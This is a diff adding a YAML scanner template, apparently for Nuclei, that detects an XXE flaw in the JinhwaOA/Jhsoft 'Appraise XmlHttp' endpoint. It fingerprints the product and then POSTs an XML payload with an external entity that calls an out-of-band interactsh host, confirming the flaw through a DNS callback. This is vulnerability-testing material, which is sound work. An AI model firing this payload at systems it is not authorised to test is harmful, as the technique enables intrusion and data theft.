@@ -1,0 +1,40 @@
+id: poc-yaml-jinher-appraise-xmlhttp-xxe
+info:
+  name: JinhwaOA Appraise XmlHttp XXE
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+  description: |
+    A vulnerability in the JinhwaOA Appraise XmlHttp feature allows XXE attacks.
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.appraise/XmlHttp.aspx/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{reverse}}"> %remote;]>
+    matchers-condition: and
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
